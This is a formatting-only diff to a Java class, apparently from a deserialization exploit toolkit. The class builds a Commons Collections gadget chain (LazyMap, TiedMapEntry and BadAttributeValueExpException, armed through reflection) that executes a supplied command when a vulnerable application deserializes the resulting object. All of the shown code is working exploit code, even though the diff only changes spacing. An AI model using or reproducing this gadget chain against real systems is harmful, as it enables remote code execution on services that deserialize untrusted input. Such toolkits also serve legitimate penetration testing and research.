@@ -52,11 +52,11 @@ public class cc5 implements ObjectPayload<BadAttributeValueExpException> {
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
         // real chain for after setup
-        final Transformer[]           transformers = TransformerUtil.makeTransformer(command);
-        final Map                     innerMap     = new HashMap();
-        final Map                     lazyMap      = LazyMap.decorate(innerMap, transformerChain);
-        TiedMapEntry                  entry        = new TiedMapEntry(lazyMap, "QI4L");
-        BadAttributeValueExpException val          = new BadAttributeValueExpException(null);
+        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
+        final Map innerMap = new HashMap();
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "QI4L");
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
         Reflections.setFieldValue(val, "val", entry);
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
